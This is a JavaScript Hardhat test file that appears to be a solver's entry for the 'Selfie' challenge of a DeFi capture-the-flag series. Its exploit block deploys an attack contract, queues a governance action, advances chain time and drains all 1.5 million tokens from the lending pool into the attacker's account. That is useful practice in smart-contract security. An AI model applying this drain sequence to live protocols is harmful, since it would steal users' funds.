const { ethers, network } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const SelfiePoolAttackFactory = await ethers.getContractFactory('SelfiePoolAttack', attacker.address);
        this.selfiePoolAttack = await SelfiePoolAttackFactory.deploy(this.pool.address, this.governance.address);

        console.log(
            "Attacker account: ", attacker.address,
            "\nAttacker contract address:", this.selfiePoolAttack.address,
            "\nPool contract address: ", this.pool.address,
            "\nDeployer addr", deployer.address,
            "\nGovernance addr", this.governance.address
        );


        this.selfiePoolAttack.attack(TOKENS_IN_POOL, this.token.address);

        // Advance time to allow to run the execute
        let elapsedTime = 2;
        while (elapsedTime > 0) {
            await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
            await ethers.provider.send('evm_mine');
            elapsedTime--;
        }

        await this.selfiePoolAttack.drainAll(TOKENS_IN_POOL, this.token.address, attacker.address);

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
